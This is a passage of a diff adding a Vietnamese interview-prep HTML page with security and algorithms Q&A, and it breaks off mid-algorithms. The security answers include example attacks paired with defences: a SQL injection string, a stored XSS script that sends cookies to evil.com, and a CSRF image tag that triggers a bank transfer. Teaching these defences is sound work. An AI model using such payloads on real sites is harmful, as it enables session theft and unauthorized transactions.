+          <p>JWT là token tự chứa thông tin (stateless), gồm 3 phần base64url-encoded ngăn cách bởi dấu <code>.</code>:</p>
+          <ul>
+            <li><strong>Header</strong>: <code>{"alg": "HS256", "typ": "JWT"}</code></li>
+            <li><strong>Payload</strong>: <code>{"sub": "user_123", "exp": 1720000, "roles": ["user"]}</code></li>
+            <li><strong>Signature</strong>: <code>HMAC-SHA256(base64(header) + "." + base64(payload), secret)</code></li>
+          </ul>
+          <p>Payload chỉ <strong>encoded</strong>, không <strong>encrypted</strong> → ai có token đều decode được → không đặt data nhạy cảm vào payload.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q3</span>
+          <span class="q-text">Access Token vs Refresh Token — tại sao cần cả hai?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Access Token</strong>: short-lived (15 phút), gửi kèm mọi API request. Nếu bị đánh cắp, thiệt hại giới hạn trong 15 phút.</li>
+            <li><strong>Refresh Token</strong>: long-lived (30 ngày), lưu trong <code>httpOnly</code> cookie (JS không đọc được). Chỉ dùng để xin AT mới khi hết hạn.</li>
+          </ul>
+          <p>Nếu chỉ có 1 token long-lived, bị đánh cắp → thiệt hại cả tháng. Tách ra thì AT ngắn hạn, RT chỉ đi qua 1 endpoint cụ thể dễ monitor và revoke.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q4</span>
+          <span class="q-text">JWT có nhược điểm gì? Làm sao handle logout?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>JWT stateless — sau khi issue, server <strong>không thể revoke trước khi hết TTL</strong>. Logout chỉ xóa token ở client-side, server vẫn chấp nhận token cũ.</p>
+          <p><strong>Giải pháp:</strong> Lưu JWT ID (<code>jti</code>) vào Redis blacklist khi logout, mỗi request check blacklist.</p>
+<pre><code class="language-python">async def logout(payload=Depends(verify_token), redis=Depends(get_redis)):
+    ttl = payload["exp"] - int(time.time())
+    await redis.setex(f"blacklist:{payload['jti']}", ttl, "1")
+
+async def verify_token(token, redis=Depends(get_redis)):
+    payload = jwt.decode(token, SECRET, algorithms=["HS256"])
+    if await redis.exists(f"blacklist:{payload['jti']}"):
+        raise HTTPException(401, "Token revoked")
+    return payload</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q5</span>
+          <span class="q-text">OAuth 2.0 là gì? Authorization Code Flow hoạt động thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>OAuth 2.0 là framework ủy quyền — cho phép app bên thứ ba truy cập resource của user <strong>mà không cần password của user</strong>.</p>
+<pre><code class="language-text">1. Client redirect user → Auth Server:
+   GET /authorize?client_id=...&redirect_uri=...&scope=openid&state=xyz
+
+2. User login + approve → Auth Server redirect về:
+   GET /callback?code=AUTH_CODE&state=xyz
+
+3. Client exchange code (server-to-server, có client_secret):
+   POST /token { grant_type: authorization_code, code: AUTH_CODE }
+
+4. Auth Server → { access_token, refresh_token, id_token }</code></pre>
+          <p>Code đi qua browser (có thể bị log), nhưng exchange code → token là server-to-server nên an toàn.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q6</span>
+          <span class="q-text">HTTPS / TLS hoạt động thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>TLS mã hóa toàn bộ data truyền giữa client và server:</p>
+<pre><code class="language-text">1. Client Hello: "Tôi hỗ trợ TLS 1.3, cipher: AES-256-GCM"
+2. Server Hello: chọn cipher + gửi certificate
+3. Client verify certificate (chữ ký từ CA tin cậy)
+4. Key exchange (ECDHE) → shared symmetric key
+5. Từ đây mọi data đều mã hóa bằng symmetric key</code></pre>
+          <p><strong>Certificate Pinning</strong> (mobile banking): App pin sha256 của server cert, từ chối kết nối nếu không khớp — chống MITM dù attacker có self-signed CA.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q7</span>
+          <span class="q-text">SQL Injection là gì? Cách phòng chống?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Attacker chèn SQL vào input để thay đổi query gốc, có thể đọc/xóa toàn bộ DB.</p>
+<pre><code class="language-python"># BAD — nguy hiểm
+name = "' OR '1'='1"
+db.execute(f"SELECT * FROM users WHERE name = '{name}'")
+# → WHERE name = '' OR '1'='1'  ← trả về toàn bộ users!
+
+# GOOD — parameterized query, DB tự escape
+await db.execute("SELECT * FROM users WHERE name = $1", name)</code></pre>
+          <p><strong>Phòng chống:</strong> Luôn dùng parameterized query. Không bao giờ format string SQL. Thêm WAF ở API Gateway.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q8</span>
+          <span class="q-text">XSS (Cross-Site Scripting) là gì? Cách phòng chống?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Attacker inject script độc hại vào trang web, browser của victim chạy script đó — đánh cắp cookie, session, redirect.</p>
+<pre><code class="language-html">&lt;!-- Stored XSS: attacker lưu vào DB, victim load trang → script chạy --&gt;
+Tên: &lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</code></pre>
+          <p><strong>Phòng chống:</strong></p>
+          <ul>
+            <li>Escape HTML output phía server (<code>html.escape()</code>)</li>
+            <li>Header <code>Content-Security-Policy: default-src 'self'</code> — browser từ chối script từ origin khác</li>
+            <li>Cookie <code>httpOnly=True</code> — JS không đọc được cookie dù XSS thành công</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q9</span>
+          <span class="q-text">CSRF (Cross-Site Request Forgery) là gì? Cách phòng chống?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Attacker lừa browser victim gửi request đến server mà victim đã login — browser <strong>tự đính kèm cookie</strong> mà không cần attacker biết giá trị.</p>
+<pre><code class="language-html">&lt;!-- evil.com --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=1000"&gt;
+&lt;!-- Browser victim tự gửi kèm cookie bank.com! --&gt;</code></pre>
+          <p><strong>Phòng chống:</strong></p>
+          <ul>
+            <li><code>SameSite=Strict</code> cookie: browser không gửi cookie trong cross-site request</li>
+            <li>CSRF Token: form ẩn chứa token random, server verify</li>
+            <li>SPA + JWT trong <code>Authorization</code> header: không bị CSRF vì browser không tự đính kèm header custom</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q10</span>
+          <span class="q-text">Password hashing — tại sao dùng bcrypt thay vì MD5/SHA1?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>MD5/SHA1 là hash nhanh → attacker brute-force hàng tỷ password/giây bằng GPU.</p>
+          <p><strong>bcrypt/argon2</strong> có <strong>work factor</strong> (cost) — cố tình chậm (~100-300ms mỗi hash). Dù GPU mạnh, brute-force vẫn cực kỳ tốn thời gian.</p>
+<pre><code class="language-python">import bcrypt
+
+# Hash khi đăng ký
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+
+# Verify khi login — timing-safe
+is_valid = bcrypt.checkpw(password.encode(), hashed)
+
+# KHÔNG dùng:
+import hashlib
+hashlib.md5(password.encode()).hexdigest()  # Crack trong vài giây!</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q11</span>
+          <span class="q-text">OWASP Top 10 — kể 5 cái quan trọng nhất với backend.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ol>
+            <li><strong>Injection</strong> (SQL, NoSQL, Command): dùng parameterized query.</li>
+            <li><strong>Broken Authentication</strong>: rate limit login, bcrypt, JWT blacklist khi logout.</li>
+            <li><strong>Sensitive Data Exposure</strong>: HTTPS everywhere, không log PII, mask card number.</li>
+            <li><strong>Security Misconfiguration</strong>: tắt debug mode production, không dùng default credentials, hide stack trace.</li>
+            <li><strong>Broken Access Control</strong>: verify authorization mọi endpoint — không chỉ dựa vào UI ẩn button.</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q12</span>
+          <span class="q-text">API Key vs JWT — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th></th><th>API Key</th><th>JWT</th></tr>
+            <tr><td>Dùng cho</td><td>Service-to-service, developer API</td><td>User authentication</td></tr>
+            <tr><td>Stateful</td><td>Có (lưu DB)</td><td>Không (self-contained)</td></tr>
+            <tr><td>Revoke</td><td>Ngay lập tức</td><td>Phải blacklist</td></tr>
+            <tr><td>Chứa thông tin</td><td>Không</td><td>Có (user_id, roles)</td></tr>
+          </table>
+          <p>Dùng API Key cho: third-party developer access, internal service gọi service. Dùng JWT cho: user session, inter-service với claims.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q13</span>
+          <span class="q-text">mTLS là gì? Dùng khi nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>mTLS (Mutual TLS) — cả <strong>client lẫn server</strong> đều phải xác thực certificate của nhau (không chỉ server như HTTPS thông thường).</p>
+          <p>Dùng cho: service-to-service authentication trong microservices, thay vì API key hardcode. Service mesh (Istio, Linkerd) tự inject mTLS giữa các pod trong Kubernetes — <strong>zero-trust network</strong>.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q14</span>
+          <span class="q-text">Principle of Least Privilege là gì? Áp dụng thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Mỗi component chỉ có đúng quyền <strong>tối thiểu cần thiết</strong> để hoạt động — không hơn.</p>
+<pre><code class="language-sql">-- Tạo DB user riêng cho app, không dùng superuser
+CREATE USER app_user WITH PASSWORD 'xxx';
+GRANT SELECT, INSERT, UPDATE ON TABLE accounts, transactions TO app_user;
+-- app_user không thể DROP TABLE, không đọc được bảng audit_logs</code></pre>
+          <p>Áp dụng ở mọi tầng: DB user, IAM role (chỉ đọc S3 bucket cụ thể), K8s ServiceAccount, API permission scope.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q15</span>
+          <span class="q-text">Secrets Management — làm sao tránh hardcode secrets?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-python"># BAD — commit vào git → lộ vĩnh viễn trong history
+DB_PASSWORD = "super_secret_123"
+
+# GOOD level 1 — environment variable
+import os
+DB_PASSWORD = os.environ["DB_PASSWORD"]
+
+# GOOD level 2 — AWS Secrets Manager / HashiCorp Vault
+import boto3
+def get_secret(name):
+    client = boto3.client("secretsmanager")
+    return client.get_secret_value(SecretId=name)["SecretString"]</code></pre>
+          <p>Thêm <code>.env</code> vào <code>.gitignore</code>. Dùng <code>git-secrets</code> hoặc <code>truffleHog</code> để scan git history phát hiện secrets đã bị commit.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q16</span>
+          <span class="q-text">Rate Limiting — các chiến lược phổ biến?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Fixed Window</strong>: đếm trong window cố định (0-60s, 60-120s). Đơn giản nhưng có burst tại ranh giới window.</li>
+            <li><strong>Sliding Window</strong>: cửa sổ di chuyển, mượt hơn. Dùng Redis Sorted Set.</li>
+            <li><strong>Token Bucket</strong>: bucket chứa token, mỗi request dùng 1, bucket refill theo thời gian. Cho phép burst ngắn có kiểm soát.</li>
+          </ul>
+<pre><code class="language-python"># Sliding window bằng Redis sorted set
+async def check_rate_limit(redis, key, limit=100, window=60):
+    now = time.time()
+    pipe = redis.pipeline()
+    pipe.zremrangebyscore(key, 0, now - window)  # Xóa entry cũ
+    pipe.zadd(key, {str(uuid4()): now})
+    pipe.zcard(key)
+    pipe.expire(key, window)
+    _, _, count, _ = await pipe.execute()
+    return count <= limit</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q17</span>
+          <span class="q-text">Làm sao bảo vệ sensitive data trong response API?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-python"># 1. Response model tự filter — không return field không cần
+class AccountResponse(BaseModel):
+    id: int
+    masked_number: str   # "****1234" thay vì số thật
+    balance: Decimal
+    # KHÔNG có: full_card_number, cvv, pin
+
+# 2. Mask trước khi log
+def mask_pan(pan: str) -> str:
+    return f"{'*' * (len(pan)-4)}{pan[-4:]}"
+logger.info("Processing card %s", mask_pan(card_number))
+
+# 3. Encrypt at rest cho field đặc biệt nhạy cảm
+from cryptography.fernet import Fernet
+cipher = Fernet(settings.FIELD_ENCRYPTION_KEY)
+encrypted_ssn = cipher.encrypt(ssn.encode())</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q18</span>
+          <span class="q-text">Security Headers quan trọng nào cần set trong API?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-python">@app.middleware("http")
+async def security_headers(request, call_next):
+    response = await call_next(request)
+    response.headers["X-Content-Type-Options"]    = "nosniff"
+    response.headers["X-Frame-Options"]           = "DENY"
+    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+    response.headers["Content-Security-Policy"]   = "default-src 'self'"
+    response.headers["Referrer-Policy"]           = "strict-origin-when-cross-origin"
+    # Xóa header lộ tech stack
+    response.headers.pop("Server", None)
+    response.headers.pop("X-Powered-By", None)
+    return response</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q19</span>
+          <span class="q-text">Làm sao audit log cho hệ thống tài chính?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Audit log phải: <strong>immutable</strong> (không sửa/xóa được), đầy đủ context (who/what/when/from-where), centralized, có alerting.</p>
+<pre><code class="language-python">async def audit_log(db, event: str, user_id: int,
+                    detail: dict, request: Request):
+    await db.execute("""
+        INSERT INTO audit_logs
+          (event, user_id, detail, ip_address, user_agent, created_at)
+        VALUES ($1, $2, $3, $4, $5, NOW())
+    """,
+        event, user_id, json.dumps(detail),
+        request.client.host,
+        request.headers.get("user-agent"),
+    )
+# Gửi sang immutable storage (S3, Elasticsearch)
+# Không để app tự DELETE được audit_logs</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q20</span>
+          <span class="q-text">Input validation — các lớp defense cần có?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><strong>Defense in depth</strong> — validate ở nhiều tầng:</p>
+<pre><code class="language-text">Client          (UX validation)
+    ↓
+API Gateway     (size limit, rate limit, WAF)
+    ↓
+Application     (Pydantic schema)        ← tầng chính
+    ↓
+Business logic  (domain rules)
+    ↓
+Database        (CHECK, NOT NULL, UNIQUE) ← safety net</code></pre>
+<pre><code class="language-python">class TransferRequest(BaseModel):
+    amount:   Decimal = Field(gt=0, le=Decimal("1_000_000"))
+    currency: str     = Field(pattern=r"^[A-Z]{3}$")
+    note: str | None  = Field(None, max_length=500)
+
+    @model_validator(mode="after")
+    def accounts_must_differ(self):
+        if self.from_account == self.to_account:
+            raise ValueError("Cannot transfer to same account")
+        return self</code></pre>
+        </div>
+      </div>
+
+    </div><!-- end .qa-list -->
+  </section>
+
+  <!-- ══════════════════════════════════════════
+       ALGORITHMS & DS
+  ══════════════════════════════════════════ -->
+  <section id="sec-algo" class="section algo">
+    <div class="section-header">
+      <div class="section-icon">🧮</div>
+      <div>
+        <h2>Algorithms & Data Structures</h2>
+        <p>Big O · Sort · BFS/DFS · Hash Table · LRU · DP · Sliding Window</p>
+      </div>
+    </div>
+    <div class="progress-bar algo"><div class="progress-fill" style="width:100%"></div></div>
+    <div class="controls">
+      <button class="ctrl-btn" onclick="expandAll('sec-algo')">Mở tất cả</button>
+      <button class="ctrl-btn" onclick="collapseAll('sec-algo')">Đóng tất cả</button>
+      <span class="count-label">20 câu hỏi</span>
+    </div>
+    <div class="qa-list">
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q1</span>
+          <span class="q-text">Big O Notation là gì? Tại sao quan trọng?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Big O mô tả tốc độ tăng của runtime/memory khi input size (n) tăng — đánh giá algorithm theo <strong>worst case</strong>.</p>
+<pre><code class="language-text">O(1) &lt; O(log n) &lt; O(n) &lt; O(n log n) &lt; O(n²) &lt; O(2ⁿ)
+Dict lookup  Binary search  Linear  Merge sort  Nested loop  Brute force</code></pre>
+          <p>Quan trọng vì: chọn sai algorithm có thể ổn với 1.000 records nhưng crash với 1 triệu records.</p>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q2</span>
+          <span class="q-text">Array vs Linked List — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th></th><th>Array</th><th>Linked List</th></tr>
+            <tr><td>Access by index</td><td>O(1)</td><td>O(n)</td></tr>
+            <tr><td>Insert/delete đầu</td><td>O(n) — phải shift</td><td>O(1)</td></tr>
+            <tr><td>Memory</td><td>Contiguous, cache-friendly</td><td>Scattered, pointer overhead</td></tr>
+          </table>
+          <p>Python <code>list</code> là dynamic array. Thực tế hầu hết dùng list — chỉ dùng linked list khi insert/delete đầu/giữa rất nhiều.</p>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q3</span>
+          <span class="q-text">Stack vs Queue — khác nhau thế nào? Ứng dụng thực tế?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Stack</strong>: LIFO — push/pop cùng một đầu. Dùng cho: undo/redo, validate parentheses, DFS, call stack.</li>
+            <li><strong>Queue</strong>: FIFO — enqueue một đầu, dequeue đầu kia. Dùng cho: BFS, task queue, rate limiting.</li>
+          </ul>
+<pre><code class="language-python">from collections import deque
+stack = []; stack.append(1); stack.pop()       # O(1)
+queue = deque(); queue.append(1); queue.popleft()  # O(1) — list.pop(0) là O(n)!</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q4</span>
+          <span class="q-text">Hash Table hoạt động thế nào? Collision xử lý thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Hash Table dùng hash function để map key → index trong array. Lookup/insert/delete trung bình <strong>O(1)</strong>.</p>
+          <p><strong>Collision</strong> (2 key cùng hash):</p>
+          <ul>
+            <li><strong>Chaining</strong>: mỗi bucket là linked list.</li>
+            <li><strong>Open Addressing</strong>: probe bucket tiếp theo (linear/quadratic probing).</li>
+          </ul>
+          <p>Python <code>dict</code> dùng open addressing — rất cache-friendly, O(1) average.</p>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q5</span>
+          <span class="q-text">Binary Search — điều kiện và cách implement?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><strong>Điều kiện bắt buộc</strong>: array phải được <strong>sort</strong> trước. Mỗi bước loại bỏ nửa search space → O(log n).</p>
+<pre><code class="language-python">def binary_search(arr, target):
+    lo, hi = 0, len(arr) - 1
+    while lo <= hi:
+        mid = (lo + hi) // 2
+        if arr[mid] == target:   return mid
+        elif arr[mid] < target:  lo = mid + 1
+        else:                    hi = mid - 1
+    return -1
+
+# Thực tế: dùng bisect module
+import bisect
+idx = bisect.bisect_left(sorted_list, target)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q6</span>
+          <span class="q-text">BFS vs DFS — khác nhau thế nào? Khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>BFS</strong> (Queue): duyệt theo từng level. Tìm <strong>shortest path</strong>, level-order traversal.</li>
+            <li><strong>DFS</strong> (Stack/recursion): đi sâu một nhánh trước. Tìm <strong>tất cả path</strong>, detect cycle, topological sort.</li>
+          </ul>
+<pre><code class="language-python">from collections import deque
+
+def bfs(graph, start):
+    visited, queue = {start}, deque([start])
+    while queue:
+        node = queue.popleft()
+        for nb in graph[node]:
+            if nb not in visited:
+                visited.add(nb); queue.append(nb)
+
+def dfs(graph, node, visited=None):
+    if visited is None: visited = set()
+    visited.add(node)
+    for nb in graph[node]:
+        if nb not in visited: dfs(graph, nb, visited)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q7</span>
+          <span class="q-text">Merge Sort vs Quick Sort — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th></th><th>Merge Sort</th><th>Quick Sort</th></tr>
+            <tr><td>Time (worst)</td><td>O(n log n)</td><td>O(n²) nếu pivot tệ</td></tr>
+            <tr><td>Space</td><td>O(n) extra</td><td>O(log n) in-place</td></tr>
+            <tr><td>Stable</td><td>Có</td><td>Không (thường)</td></tr>
+          </table>
+          <p>Dùng Merge Sort khi cần <strong>stable sort</strong>. Quick Sort nhanh hơn trong thực tế vì cache-friendly. Python <code>sorted()</code> dùng <strong>Timsort</strong> (hybrid) — stable, O(n log n).</p>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q8</span>
+          <span class="q-text">Heap là gì? Ứng dụng thực tế?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Heap là complete binary tree với heap property: min-heap thì parent ≤ children. Insert/delete O(log n), get-min <strong>O(1)</strong>.</p>
+<pre><code class="language-python">import heapq
+
+heap = []
+heapq.heappush(heap, 5); heapq.heappush(heap, 1)
+print(heapq.heappop(heap))   # 1 — luôn lấy min
+
+# Top K giao dịch lớn nhất
+top3 = heapq.nlargest(3, transactions, key=lambda t: t.amount)
+
+# Priority retry queue — retry_at nhỏ nhất lên đầu
+heapq.heappush(retry_queue, (retry_at_timestamp, task))</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q9</span>
+          <span class="q-text">LRU Cache — implement thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>LRU (Least Recently Used): khi cache đầy, evict item ít dùng nhất. Implement bằng <strong>OrderedDict</strong> (dict + doubly linked list) → O(1) cho cả get và put.</p>
+<pre><code class="language-python">from collections import OrderedDict
+
+class LRUCache:
+    def __init__(self, capacity):
+        self.cap = capacity
+        self.cache = OrderedDict()
+
+    def get(self, key):
+        if key not in self.cache: return -1
+        self.cache.move_to_end(key)    # Mark recently used
+        return self.cache[key]
+
+    def put(self, key, value):
+        if key in self.cache: self.cache.move_to_end(key)
+        self.cache[key] = value
+        if len(self.cache) > self.cap:
+            self.cache.popitem(last=False)  # Evict LRU</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q10</span>
+          <span class="q-text">Dynamic Programming là gì? Khi nào nhận ra được DP?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>DP giải bài có <strong>overlapping subproblems</strong> + <strong>optimal substructure</strong> bằng cách lưu kết quả sub-problem để tránh tính lại.</p>
+          <p><strong>Nhận ra DP khi:</strong> bài hỏi min/max/count/feasibility, chia được thành subproblem cùng dạng, brute force có exponential complexity.</p>
+<pre><code class="language-python"># Coin change: số coin tối thiểu để đổi amount
+def coin_change(coins, amount):
+    dp = [float("inf")] * (amount + 1)
+    dp[0] = 0
+    for i in range(1, amount + 1):
+        for coin in coins:
+            if coin <= i:
+                dp[i] = min(dp[i], dp[i - coin] + 1)
+    return dp[amount] if dp[amount] != float("inf") else -1
+# O(amount × coins) thay vì O(2^amount) brute force</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q11</span>
+          <span class="q-text">Two Sum — giải O(n) thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng hash map lưu <code>value → index</code> khi duyệt qua. Mỗi phần tử check xem complement (<code>target - num</code>) đã thấy chưa.</p>
+<pre><code class="language-python">def two_sum(nums, target):
+    seen = {}   # value → index
+    for i, num in enumerate(nums):
+        complement = target - num
+        if complement in seen:
+            return (seen[complement], i)
+        seen[num] = i
+    return (-1, -1)
+
+# [2, 7, 11, 15], target=9 → (0, 1)
+# O(n) time, O(n) space — tốt hơn brute force O(n²)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q12</span>
+          <span class="q-text">Valid Parentheses — giải bằng Stack?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-python">def is_valid(s: str) -> bool:
+    stack = []
+    mapping = {")": "(", "}": "{", "]": "["}
+    for char in s:
+        if char in mapping:
+            top = stack.pop() if stack else "#"
+            if mapping[char] != top: return False
+        else:
+            stack.append(char)
+    return not stack
+
+# "()[]{}" → True
+# "([)]"   → False
+# Ứng dụng: validate JSON template, SQL expression parser</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q13</span>
+          <span class="q-text">Sliding Window — pattern và khi nào dùng?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng khi bài hỏi về subarray/substring <strong>liên tiếp</strong> — tránh nested loop O(n²).</p>
+<pre><code class="language-python"># Max sum subarray kích thước k — O(n)
+def max_sum(nums, k):
+    window = sum(nums[:k])
+    best = window
+    for i in range(k, len(nums)):
+        window += nums[i] - nums[i - k]   # Trượt cửa sổ
+        best = max(best, window)
+    return best
+
+# Ứng dụng: đếm request trong sliding window (rate limiting)
+# Longest substring không ký tự lặp → variable-size window</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q14</span>
+          <span class="q-text">Đảo ngược Linked List (iterative)?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-python">def reverse(head):
+    prev, curr = None, head
+    while curr:
+        nxt = curr.next    # Lưu next
+        curr.next = prev   # Đảo chiều
+        prev = curr        # Tiến prev
+        curr = nxt         # Tiến curr
+    return prev            # prev là head mới
+
+# 1→2→3→None  thành  3→2→1→None
+# O(n) time, O(1) space</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q15</span>
+          <span class="q-text">Detect cycle trong Linked List (Floyd's algorithm)?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng 2 pointer: slow đi 1 bước, fast đi 2 bước. Nếu có cycle thì chúng sẽ gặp nhau.</p>
+<pre><code class="language-python">def has_cycle(head) -> bool:
+    slow = fast = head
+    while fast and fast.next:
+        slow = slow.next
+        fast = fast.next.next
+        if slow is fast:   # Gặp nhau → có cycle
+            return True
+    return False
+# O(n) time, O(1) space — không cần Set lưu visited</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q16</span>
+          <span class="q-text">Tree Traversal — inorder, preorder, postorder?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+<pre><code class="language-python">def inorder(root):    # Left → Root → Right  (BST: sorted order)
+    if root:
+        inorder(root.left); print(root.val); inorder(root.right)
+
+def preorder(root):   # Root → Left → Right  (serialize tree)
+    if root:
+        print(root.val); preorder(root.left); preorder(root.right)
+
+def postorder(root):  # Left → Right → Root  (delete tree, calculate)
+    if root:
+        postorder(root.left); postorder(root.right); print(root.val)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card algo">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q17</span>
+          <span class="q-text">Topological Sort là gì? Ứng dụng thực tế?</span>
